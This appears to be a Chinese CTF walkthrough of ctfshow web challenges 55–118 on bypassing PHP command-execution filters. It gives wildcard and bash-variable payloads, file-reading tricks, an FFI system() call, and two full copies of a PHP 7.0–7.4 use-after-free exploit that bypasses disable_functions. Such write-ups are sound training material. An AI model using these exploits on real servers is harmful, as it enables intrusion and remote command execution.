<h2 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php

if(isset($_GET[&#39;c&#39;]))&#123;
    $c&#x3D;$_GET[&#39;c&#39;];
    if(!preg_match(&quot;&#x2F;\;|[a-z]|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;
        system($c);
    &#125;
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>payload1</p>
<p>利用base64命令和通配符</p>
<pre class="language-none"><code class="language-none">c&#x3D;&#x2F;???&#x2F;????64 ????.???</code></pre>

<p>payload2</p>
<p>p牛是真的厉害</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=1#reply-list">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=1#reply-list</a></p>
<p>直接利用p牛博客里的这个</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430174531949.png" alt="image-20220430174531949"></p>
<p>然后cat flag.php</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430174552316.png" alt="image-20220430174552316"></p>
<p>有几率不成功，因为临时文件的文件名是随机的，如果没成功就是没大写，多试几次就行了</p>
<h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430175025474.png" alt="image-20220430175025474"></p>
<p>另外这里如果是eval函数，那执行时还要加上?&gt;&lt;?=</p>
<p>payload为</p>
<pre class="language-php" data-language="php"><code class="language-php">?&gt;&lt;?&#x3D;&#96;. &#x2F;???&#x2F;????????[@-[]&#96;;?&gt;</code></pre>

<p>  原因是eval()函数相当于执行php的代码，而&lt;?= 就相当于&lt;?php echo<code> </code>在PHP7以上不管short_open_tag配置是不是开启的。都可以使用。<code> </code>所以就相当于一个新的PHP文件，这样的话就需要将最开始前面的&lt;?php给闭合，不然不会执行。<code> </code>闭合之后就相当于</p>
<h2 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
&#x2F;&#x2F; 还能炫的动吗？
&#x2F;&#x2F;flag in 36.php
if(isset($_GET[&#39;c&#39;]))&#123;
    $c&#x3D;$_GET[&#39;c&#39;];
    if(!preg_match(&quot;&#x2F;\;|[a-z]|[0-9]|\&#96;|\|\#|\&#39;|\&quot;|\&#96;|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\&#x3D;|\[&#x2F;i&quot;, $c))&#123;
        system(&quot;cat &quot;.$c.&quot;.php&quot;);
    &#125;
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p><code>$&#123;_&#125;</code>:代表上一次命令执行的结果<br><code>$(())</code>: 做运算</p>
<p>之前没有命令返回或者执行,结果应该是空,与<code>&quot;&quot;</code>等价<br>又 <code>$((&quot;&quot;))</code>值为0,<code>$((~$((&quot;&quot;))))</code>值为-1,再做拼接:</p>
<p>payload</p>
<pre class="language-none"><code class="language-none">$((~$(($((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))))))</code></pre>

<h2 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h2><p>有一堆禁用函数</p>
<p>print_r(scandir(&#39;.&#39;));或者print_r(glob(&quot;*&quot;));读目录</p>
<table>
<thead>
<tr>
<th></th>
<th>扫目录找flag位置</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td>print_r(scandir(&#39;./&#39;));</td>
</tr>
<tr>
<td></td>
<td>$a=opendir(&#39;./&#39;);while(($file = readdir($a)) !=false){echo $file.&quot; &quot;;}</td>
</tr>
<tr>
<td></td>
<td>var_dump(scandir(&quot;/&quot;));</td>
</tr>
<tr>
<td></td>
<td>$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f){echo($f-&gt;__toString().&quot; &quot;);}</td>
</tr>
</tbody></table>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430181502718.png" alt="image-20220430181502718"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430182020777.png" alt="image-20220430182020777"></p>
<p>c=print_r(file_get_contents(&#39;flag.php&#39;));或者readfile或者show_source或者highlight_file读文件</p>
<p>还可以更骚一点</p>
<p>POST c=include($_GET[&#39;url&#39;]); </p>
<p>GET /?url=php://filter/read=convert.base64-encode/resource=flag.php</p>
<p>附一点读文件的方式</p>
<pre class="language-php" data-language="php"><code class="language-php">highlight_file($filename);
show_source($filename);
print_r(php_strip_whitespace($filename));
print_r(file_get_contents($filename));
readfile($filename);
print_r(file($filename)); &#x2F;&#x2F; var_dump
fread(fopen($filename,&quot;r&quot;), $size);&#x2F;&#x2F;print_r(fread(fopen(&quot;flag.php&quot;,&quot;r&quot;), filesize(&quot;flag.php&quot;)));
include($filename); &#x2F;&#x2F; 非php代码
include_once($filename); &#x2F;&#x2F; 非php代码
require($filename); &#x2F;&#x2F; 非php代码
require_once($filename); &#x2F;&#x2F; 非php代码  伪协议读源码
print_r(fread(popen(&quot;cat flag&quot;, &quot;r&quot;), $size));
print_r(fgets(fopen($filename, &quot;r&quot;))); &#x2F;&#x2F; 读取一行$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D;    fgets($a);echo $line;&#125;
fpassthru(fopen($filename, &quot;r&quot;)); &#x2F;&#x2F; 从当前位置一直读取到 EOF
print_r(fgetcsv(fopen($filename,&quot;r&quot;), $size));&#x2F;&#x2F;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D; fgetcsv($a);var_dump($line);&#125;
print_r(fgetss(fopen($filename, &quot;r&quot;))); &#x2F;&#x2F; 从文件指针中读取一行并过滤掉 HTML 标记
print_r(fscanf(fopen(&quot;flag&quot;, &quot;r&quot;),&quot;%s&quot;));&#x2F;&#x2F;c&#x3D;$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;print_r(fscanf($a,&quot;%s&quot;));&#125;;
print_r(parse_ini_file($filename)); &#x2F;&#x2F; 失败时返回 false , 成功返回配置数组</code></pre>

<h2 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h2><p>file_get_contents和readfile没了，可以用其他俩</p>
<h2 id="web60-65"><a href="#web60-65" class="headerlink" title="web60-65"></a>web60-65</h2><p>同web58，差不多就那几个函数，用show_source能全过</p>
<h2 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h2><pre class="language-none"><code class="language-none">c&#x3D;print_r(scandir(&#39;&#x2F;&#39;));highlight_file(&quot;&#x2F;flag.txt&quot;);</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430204318885.png" alt="image-20220430204318885"></p>
<h2 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h2><p>print_r禁了</p>
<p>用var_dump</p>
<pre class="language-none"><code class="language-none">c&#x3D;var_dump(scandir(&#39;&#x2F;&#39;));highlight_file(&quot;&#x2F;flag.txt&quot;);</code></pre>

<h2 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h2><pre class="language-none"><code class="language-none">c&#x3D;var_dump(scandir(&#39;&#x2F;&#39;));include(&quot;&#x2F;flag.txt&quot;)</code></pre>

<p>看根目录，然后直接include包含</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430211411455.png" alt="image-20220430211411455"></p>
<h2 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h2><p>var_dump也没了，但是还有var_export</p>
<pre class="language-php" data-language="php"><code class="language-php">c&#x3D;var_export(scandir(&#39;&#x2F;&#39;));include(&quot;&#x2F;flag.txt&quot;);</code></pre>

<p>y4师傅还有一个用php的原生类遍历目录的骚操作</p>
<pre class="language-none"><code class="language-none">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</code></pre>

<p>然后包含这个我文件</p>
<pre class="language-none"><code class="language-none">c&#x3D;include(&#39;&#x2F;flag.txt&#39;);
c&#x3D;require(&#39;&#x2F;flag.txt&#39;);
c&#x3D;require_once(&#39;&#x2F;flag.txt&#39;);</code></pre>

<h2 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h2><p>同69</p>
<h2 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h2><pre class="language-none"><code class="language-none">&lt;?php

error_reporting(0);
ini_set(&#39;display_errors&#39;, 0);
&#x2F;&#x2F; 你们在炫技吗？
if(isset($_POST[&#39;c&#39;]))&#123;
        $c&#x3D; $_POST[&#39;c&#39;];
        eval($c);
        $s &#x3D; ob_get_contents();
        ob_end_clean();
        echo preg_replace(&quot;&#x2F;[0-9]|[a-z]&#x2F;i&quot;,&quot;?&quot;,$s);
&#125;else&#123;
    highlight_file(__FILE__);
&#125;
?&gt;


</code></pre>

<p>ob_get_contents — 返回输出缓冲区的内容<br>ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲</p>
<blockquote>
<p>此函数丢弃最顶层输出缓冲区的内容并关闭这个缓冲区。如果想要进一步处理缓冲区的内容，必须在ob_end_clean()之前调用ob_get_contents()，因为当调用ob_end_clean()时缓冲区内容将被丢弃</p>
</blockquote>
<p>要用<code>exit();</code>使程序提前退出，绕过后面的正则表达式</p>
<pre class="language-php" data-language="php"><code class="language-php">c&#x3D;var_export(scandir(&#39;&#x2F;&#39;));include(&quot;&#x2F;flag.txt&quot;);exit();</code></pre>



<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430220313035.png" alt="image-20220430220313035"></p>
<h2 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h2><p>scandir被禁用了</p>
<p>用y4师傅的那个原生类来查目录，但是文件没有权限被包含</p>
<p>y4师傅推荐的脚本</p>
<pre class="language-none"><code class="language-none">&lt;?php

# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)
#
# Bug: https:&#x2F;&#x2F;bugs.php.net&#x2F;bug.php?id&#x3D;76047
# debug_backtrace() returns a reference to a variable 
# that has been destroyed, causing a UAF vulnerability.
#
# This exploit should work on all PHP 7.0-7.4 versions
# released as of 30&#x2F;01&#x2F;2020.
#
# Author: https:&#x2F;&#x2F;github.com&#x2F;mm0r1

pwn(&quot;uname -a&quot;);

function pwn($cmd) &#123;
    global $abc, $helper, $backtrace;

    class Vuln &#123;
        public $a;
        public function __destruct() &#123; 
            global $backtrace; 
            unset($this-&gt;a);
            $backtrace &#x3D; (new Exception)-&gt;getTrace(); # ;)
            if(!isset($backtrace[1][&#39;args&#39;])) &#123; # PHP &gt;&#x3D; 7.4
                $backtrace &#x3D; debug_backtrace();
            &#125;
        &#125;
    &#125;

    class Helper &#123;
        public $a, $b, $c, $d;
    &#125;

    function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8) &#123;
        $address &#x3D; 0;
        for($j &#x3D; $s-1; $j &gt;&#x3D; 0; $j--) &#123;
            $address &lt;&lt;&#x3D; 8;
            $address |&#x3D; ord($str[$p+$j]);
        &#125;
        return $address;
    &#125;

    function ptr2str($ptr, $m &#x3D; 8) &#123;
        $out &#x3D; &quot;&quot;;
        for ($i&#x3D;0; $i &lt; $m; $i++) &#123;
            $out .&#x3D; chr($ptr &amp; 0xff);
            $ptr &gt;&gt;&#x3D; 8;
        &#125;
        return $out;
    &#125;

    function write(&amp;$str, $p, $v, $n &#x3D; 8) &#123;
        $i &#x3D; 0;
        for($i &#x3D; 0; $i &lt; $n; $i++) &#123;
            $str[$p + $i] &#x3D; chr($v &amp; 0xff);
            $v &gt;&gt;&#x3D; 8;
        &#125;
    &#125;

    function leak($addr, $p &#x3D; 0, $s &#x3D; 8) &#123;
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak &#x3D; strlen($helper-&gt;a);
        if($s !&#x3D; 8) &#123; $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1; &#125;
        return $leak;
    &#125;

    function parse_elf($base) &#123;
        $e_type &#x3D; leak($base, 0x10, 2);

        $e_phoff &#x3D; leak($base, 0x20);
        $e_phentsize &#x3D; leak($base, 0x36, 2);
        $e_phnum &#x3D; leak($base, 0x38, 2);

        for($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123;
            $header &#x3D; $base + $e_phoff + $i * $e_phentsize;
            $p_type  &#x3D; leak($header, 0, 4);
            $p_flags &#x3D; leak($header, 4, 4);
            $p_vaddr &#x3D; leak($header, 0x10);
            $p_memsz &#x3D; leak($header, 0x28);

            if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123; # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size &#x3D; $p_memsz;
            &#125; else if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123; # PT_LOAD, PF_Read_exec
                $text_size &#x3D; $p_memsz;
            &#125;
        &#125;

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    &#125;

    function get_basic_funcs($base, $elf) &#123;
        list($data_addr, $text_size, $data_size) &#x3D; $elf;
        for($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123;
            $leak &#x3D; leak($data_addr, $i * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;
                $deref &#x3D; leak($leak);
                # &#39;constant&#39; constant check
                if($deref !&#x3D; 0x746e6174736e6f63)
                    continue;
            &#125; else continue;

            $leak &#x3D; leak($data_addr, ($i + 4) * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;
                $deref &#x3D; leak($leak);
                # &#39;bin2hex&#39; constant check
                if($deref !&#x3D; 0x786568326e6962)
                    continue;
            &#125; else continue;

            return $data_addr + $i * 8;
        &#125;
    &#125;

    function get_binary_base($binary_leak) &#123;
        $base &#x3D; 0;
        $start &#x3D; $binary_leak &amp; 0xfffffffffffff000;
        for($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123;
            $addr &#x3D; $start - 0x1000 * $i;
            $leak &#x3D; leak($addr, 0, 7);
            if($leak &#x3D;&#x3D; 0x10102464c457f) &#123; # ELF header
                return $addr;
            &#125;
        &#125;
    &#125;

    function get_system($basic_funcs) &#123;
        $addr &#x3D; $basic_funcs;
        do &#123;
            $f_entry &#x3D; leak($addr);
            $f_name &#x3D; leak($f_entry, 0, 6);

            if($f_name &#x3D;&#x3D; 0x6d6574737973) &#123; # system
                return leak($addr + 8);
            &#125;
            $addr +&#x3D; 0x20;
        &#125; while($f_entry !&#x3D; 0);
        return false;
    &#125;

    function trigger_uaf($arg) &#123;
        # str_shuffle prevents opcache string interning
        $arg &#x3D; str_shuffle(str_repeat(&#39;A&#39;, 79));
        $vuln &#x3D; new Vuln();
        $vuln-&gt;a &#x3D; $arg;
    &#125;

    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;
        die(&#39;This PoC is for *nix systems only.&#39;);
    &#125;

    $n_alloc &#x3D; 10; # increase this value if UAF fails
    $contiguous &#x3D; [];
    for($i &#x3D; 0; $i &lt; $n_alloc; $i++)
        $contiguous[] &#x3D; str_shuffle(str_repeat(&#39;A&#39;, 79));

    trigger_uaf(&#39;x&#39;);
    $abc &#x3D; $backtrace[1][&#39;args&#39;][0];

    $helper &#x3D; new Helper;
    $helper-&gt;b &#x3D; function ($x) &#123; &#125;;

    if(strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123;
        die(&quot;UAF failed&quot;);
    &#125;

    # leaks
    $closure_handlers &#x3D; str2ptr($abc, 0);
    $php_heap &#x3D; str2ptr($abc, 0x58);
    $abc_addr &#x3D; $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj &#x3D; str2ptr($abc, 0x20);

    $binary_leak &#x3D; leak($closure_handlers, 8);
    if(!($base &#x3D; get_binary_base($binary_leak))) &#123;
        die(&quot;Couldn&#39;t determine binary base address&quot;);
    &#125;

    if(!($elf &#x3D; parse_elf($base))) &#123;
        die(&quot;Couldn&#39;t parse ELF header&quot;);
    &#125;

    if(!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123;
        die(&quot;Couldn&#39;t get basic_functions address&quot;);
    &#125;

    if(!($zif_system &#x3D; get_system($basic_funcs))) &#123;
        die(&quot;Couldn&#39;t get zif_system address&quot;);
    &#125;

    # fake closure object
    $fake_obj_offset &#x3D; 0xd0;
    for($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123;
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    &#125;

    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler

    ($helper-&gt;b)($cmd);
    exit();
&#125;
pwn(&quot;cat &#x2F;flag0.txt&quot;);ob_end_flush();</code></pre>

<p>//上边这个脚本过不了的原因是题目环境禁用了str_repeat，所以手动重复79个A就行了</p>
<p>群主给的</p>
<pre class="language-none"><code class="language-none">c&#x3D;function ctfshow($cmd) &#123;
    global $abc, $helper, $backtrace;

    class Vuln &#123;
        public $a;
        public function __destruct() &#123; 
            global $backtrace; 
            unset($this-&gt;a);
            $backtrace &#x3D; (new Exception)-&gt;getTrace();
            if(!isset($backtrace[1][&#39;args&#39;])) &#123;
                $backtrace &#x3D; debug_backtrace();
            &#125;
        &#125;
    &#125;

    class Helper &#123;
        public $a, $b, $c, $d;
    &#125;

    function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8) &#123;
        $address &#x3D; 0;
        for($j &#x3D; $s-1; $j &gt;&#x3D; 0; $j--) &#123;
            $address &lt;&lt;&#x3D; 8;
            $address |&#x3D; ord($str[$p+$j]);
        &#125;
        return $address;
    &#125;

    function ptr2str($ptr, $m &#x3D; 8) &#123;
        $out &#x3D; &quot;&quot;;
        for ($i&#x3D;0; $i &lt; $m; $i++) &#123;
            $out .&#x3D; sprintf(&quot;%c&quot;,($ptr &amp; 0xff));
            $ptr &gt;&gt;&#x3D; 8;
        &#125;
        return $out;
    &#125;

    function write(&amp;$str, $p, $v, $n &#x3D; 8) &#123;
        $i &#x3D; 0;
        for($i &#x3D; 0; $i &lt; $n; $i++) &#123;
            $str[$p + $i] &#x3D; sprintf(&quot;%c&quot;,($v &amp; 0xff));
            $v &gt;&gt;&#x3D; 8;
        &#125;
    &#125;

    function leak($addr, $p &#x3D; 0, $s &#x3D; 8) &#123;
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak &#x3D; strlen($helper-&gt;a);
        if($s !&#x3D; 8) &#123; $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1; &#125;
        return $leak;
    &#125;

    function parse_elf($base) &#123;
        $e_type &#x3D; leak($base, 0x10, 2);

        $e_phoff &#x3D; leak($base, 0x20);
        $e_phentsize &#x3D; leak($base, 0x36, 2);
        $e_phnum &#x3D; leak($base, 0x38, 2);

        for($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123;
            $header &#x3D; $base + $e_phoff + $i * $e_phentsize;
            $p_type  &#x3D; leak($header, 0, 4);
            $p_flags &#x3D; leak($header, 4, 4);
            $p_vaddr &#x3D; leak($header, 0x10);
            $p_memsz &#x3D; leak($header, 0x28);

            if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123; 

                $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size &#x3D; $p_memsz;
            &#125; else if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123; 
                $text_size &#x3D; $p_memsz;
            &#125;
        &#125;

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    &#125;

    function get_basic_funcs($base, $elf) &#123;
        list($data_addr, $text_size, $data_size) &#x3D; $elf;
        for($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123;
            $leak &#x3D; leak($data_addr, $i * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;
                $deref &#x3D; leak($leak);
                
                if($deref !&#x3D; 0x746e6174736e6f63)
                    continue;
            &#125; else continue;

            $leak &#x3D; leak($data_addr, ($i + 4) * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;
                $deref &#x3D; leak($leak);
                
                if($deref !&#x3D; 0x786568326e6962)
                    continue;
            &#125; else continue;

            return $data_addr + $i * 8;
        &#125;
    &#125;

    function get_binary_base($binary_leak) &#123;
        $base &#x3D; 0;
        $start &#x3D; $binary_leak &amp; 0xfffffffffffff000;
        for($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123;
            $addr &#x3D; $start - 0x1000 * $i;
            $leak &#x3D; leak($addr, 0, 7);
            if($leak &#x3D;&#x3D; 0x10102464c457f) &#123;
                return $addr;
            &#125;
        &#125;
    &#125;

    function get_system($basic_funcs) &#123;
        $addr &#x3D; $basic_funcs;
        do &#123;
            $f_entry &#x3D; leak($addr);
            $f_name &#x3D; leak($f_entry, 0, 6);

            if($f_name &#x3D;&#x3D; 0x6d6574737973) &#123;
                return leak($addr + 8);
            &#125;
            $addr +&#x3D; 0x20;
        &#125; while($f_entry !&#x3D; 0);
        return false;
    &#125;

    function trigger_uaf($arg) &#123;

        $arg &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
        $vuln &#x3D; new Vuln();
        $vuln-&gt;a &#x3D; $arg;
    &#125;

    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;
        die(&#39;This PoC is for *nix systems only.&#39;);
    &#125;

    $n_alloc &#x3D; 10; 
    $contiguous &#x3D; [];
    for($i &#x3D; 0; $i &lt; $n_alloc; $i++)
        $contiguous[] &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);

    trigger_uaf(&#39;x&#39;);
    $abc &#x3D; $backtrace[1][&#39;args&#39;][0];

    $helper &#x3D; new Helper;
    $helper-&gt;b &#x3D; function ($x) &#123; &#125;;

    if(strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123;
        die(&quot;UAF failed&quot;);
    &#125;

    $closure_handlers &#x3D; str2ptr($abc, 0);
    $php_heap &#x3D; str2ptr($abc, 0x58);
    $abc_addr &#x3D; $php_heap - 0xc8;

    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj &#x3D; str2ptr($abc, 0x20);

    $binary_leak &#x3D; leak($closure_handlers, 8);
    if(!($base &#x3D; get_binary_base($binary_leak))) &#123;
        die(&quot;Couldn&#39;t determine binary base address&quot;);
    &#125;

    if(!($elf &#x3D; parse_elf($base))) &#123;
        die(&quot;Couldn&#39;t parse ELF header&quot;);
    &#125;

    if(!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123;
        die(&quot;Couldn&#39;t get basic_functions address&quot;);
    &#125;

    if(!($zif_system &#x3D; get_system($basic_funcs))) &#123;
        die(&quot;Couldn&#39;t get zif_system address&quot;);
    &#125;


    $fake_obj_offset &#x3D; 0xd0;
    for($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123;
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    &#125;

    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); 
    write($abc, 0xd0 + 0x68, $zif_system); 

    ($helper-&gt;b)($cmd);
    exit();
&#125;

ctfshow(&quot;cat &#x2F;flag0.txt&quot;);ob_end_flush();
#需要通过url编码哦
</code></pre>

<h2 id="web73-74"><a href="#web73-74" class="headerlink" title="web73-74"></a>web73-74</h2><pre class="language-none"><code class="language-none">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;include(&#39;&#x2F;flagc.txt&#39;);exit();</code></pre>

<h2 id="Web75-76"><a href="#Web75-76" class="headerlink" title="Web75-76"></a>Web75-76</h2><p>读目录，发现flag36.txt，但是不能包含，uaf失败</p>
<p>用mysql的load_file读取文件</p>
<pre class="language-none"><code class="language-none">c&#x3D;try &#123;$dbh &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;ctftraining&#39;, &#39;root&#39;,
&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;&#x2F;flag36.txt&quot;)&#39;) as $row)
&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh &#x3D; null;&#125;catch (PDOException $e) &#123;echo $e-getMessage();exit(0);&#125;exit(0);</code></pre>

<p>感觉。。。正常应该是不会这样的 ，没用户名和密码怎么读</p>
<h2 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h2><p>利用FFI，php7.4以上才有</p>
<pre class="language-none"><code class="language-none">$ffi &#x3D; FFI::cdef(&quot;int system(const char *command);&quot;);&#x2F;&#x2F;创建一个system对象
$a&#x3D;&#39;&#x2F;readflag &gt; 1.txt&#39;;&#x2F;&#x2F;没有回显的
这里因为不能回显，所以利用重定向将readflag内容输出到其他地方
$ffi-&gt;system($a);&#x2F;&#x2F;通过$ffi去调用system函数</code></pre>

<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ffi.cdef.php">https://www.php.net/manual/zh/ffi.cdef.php</a></p>
<p><a target="_blank" rel="noopener" href="https://www.php.cn/php-weizijiaocheng-415807.html">https://www.php.cn/php-weizijiaocheng-415807.html</a></p>
<p>实话实话没太看懂</p>
<pre class="language-none"><code class="language-none">c&#x3D;$ffi&#x3D;FFI::cdef(&quot;int system(char *command);&quot;, &quot;libc.so.6&quot;);$a&#x3D;&#39;&#x2F;readflag &gt; 1.txt&#39;;$ffi-&gt;system($a);exit();  </code></pre>

<p>打完payload访问一下1.txt就能拿到flag</p>
<p>后边的题感觉有点玄幻了，就单纯的记一下方法</p>
<h1 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h1><p> 源码里有system($code);但是有waf</p>
<pre class="language-none"><code class="language-none">!preg_match(&#39;&#x2F;\x09|\x0a|[a-z]|[0-9]|\&#x2F;|\(|\)|\[|\]|\\\\|\+|\-|\!|\&#x3D;|\^|\*|\x26|\%|\&lt;|\&gt;|\&#39;|\&quot;|\&#96;|\||\,&#x2F;&#39;</code></pre>

<p>利用bash内置变量来rce</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430231046010.png" alt="image-20220430231046010"></p>
<pre class="language-none"><code class="language-none">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$IFS????.???</code></pre>

<pre class="language-none"><code class="language-none"># echo $&#123;PWD&#125; 
&#x2F;root

# echo $&#123;PWD:0:1&#125;      #表示从0下标开始的第一个字符
&#x2F;           

# echo $&#123;PWD:~0:1&#125;      #从结尾开始往前的第一个字符
t

# echo $&#123;PWD:~0&#125;      
t

# echo $&#123;PWD:~A&#125;       #所以字母和0具有同样作用             
t

# echo $&#123;PATH&#125;                            
&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin
</code></pre>

<pre class="language-none"><code class="language-none">&#x2F;&#x2F;利用系统变量构造nl命令
$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$IFS????.???

$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;是nl
</code></pre>

